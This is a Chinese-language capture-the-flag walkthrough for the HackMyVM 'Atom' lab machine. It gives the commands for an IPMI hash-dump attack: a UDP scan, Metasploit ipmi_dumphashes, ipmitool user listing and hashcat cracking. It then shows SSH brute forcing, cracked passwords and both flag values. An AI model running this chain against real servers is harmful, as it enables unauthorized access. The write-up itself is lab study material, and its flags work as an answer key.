# Atom

2025.03.23 https://hackmyvm.eu/machines/machine.php?vm=Atom

[video](https://www.bilibili.com/video/BV1LooqYUEom/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

tcp 上没开放端口，udp 上开放了 623/udp open asf-rmcp 是一种 IPMI 协议：

```
sudo nmap -sU --min-rate 10000 --top-ports 2000 192.168.5.40
```

在 msf 中有这样的扫描模块：auxiliary/scanner/ipmi/ipmi_cipher_zero 确认存在漏洞之后，可以使用这个模块 dump 枚举出的用户的密码 auxiliary/scanner/ipmi/ipmi_dumphashes (参考链接 https://hacktricks.boitatech.com.br/pentesting/623-udp-ipmi)

```
Hash for user 'admin' matches password 'cukorborso'
```

使用获得的凭据进行 ssh 登陆，不行。在用上面的这个凭据，在获取一下 user list：

```
sudo apt install ipmitool
ipmitool -I lanplus -H 192.168.5.40 -U admin -P cukorborso user list|awk -F ' ' '{print $2}'|grep -v 'true' > name.txt
```

将获得的用户名和哈希保存到 dump 文件，进行处理：

```
cat dump|awk -F ' ' '{print $8}'|awk -F ':' '{print $2":"$3}' > hash1
```

然后用 hashcat 7300 模式进行破解：

```
hashcat -a 0 -m 7300 hash1 /usr/share/wordlists/rockyou.txt --potfile-disable
```

然后将结果保存，进行处理，拿到最后一个字段：

```
cat out|awk -F ':' '{print $3}' > pass
```

然后将上面获得的 user 和 pass 进行 ssh 爆破,找到 1 个登陆凭据：

```
[22][ssh] host: 192.168.5.40   login: onida   password: jiggaman
```

直接拿到 user flag:

```
onida@atom:~$ cat user.txt
f75390001fa2fe806b4e3f1e5dadeb2b
```

在 /var/www/html 目录中发现 atom-2400-database.db ，查看其内容，爆破 user 表种 atom 用户的密码为 madison ，尝试用密码 madison 切换到 root，切换成功。

root flag:

```
root@atom:~# cat root.txt
d3a4fd660f1af5a7e3c2f17314f4a962
```
